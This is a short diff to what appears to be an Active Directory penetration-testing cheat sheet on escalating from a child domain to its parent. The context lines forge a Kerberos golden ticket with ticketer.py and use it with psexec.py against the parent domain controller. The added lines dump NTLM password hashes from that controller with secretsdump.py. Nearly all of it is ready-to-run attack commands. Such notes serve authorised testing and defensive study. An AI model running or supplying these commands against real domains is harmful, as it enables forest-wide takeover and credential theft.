@@ -200,6 +200,9 @@ ticketer.py -nthash <KRBTGT_HASH> -domain CHILD-DOMAIN.LOCAL -domain-sid <CHILD_
 # 4. Use ticket
 export KRB5CCNAME=FAKE-USER.ccache
 psexec.py CHILD-DOMAIN.LOCAL/FAKE-USER@PARENT-DC.PARENT-DOMAIN.LOCAL -k -no-pass -target-ip <PARENT_DC_IP>
+
+# 5. Dumping creds on parent domain:
+secretsdump.py FAKE-USER@PARENT-DC.PARENT-DOMAIN.LOCAL -k -no-pass -just-dc-ntlm -just-dc-user <username>
 ```
 
 #### Method 2: Automated with raiseChild.py
